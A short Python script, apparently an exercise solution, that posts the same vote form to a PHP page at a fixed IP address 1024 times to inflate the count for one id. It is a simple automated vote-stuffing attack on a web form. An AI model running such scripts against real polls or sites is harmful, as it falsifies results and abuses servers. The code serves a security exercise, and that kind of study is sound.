#!/usr/bin/python3

import requests

ID = 110
URL = "http://158.69.76.135/level0.php"
payload = {
    'id': ID,
    'holdthedoor': 'Submit'
}
for i in range(1024):
    r = requests.post(URL, data=payload)
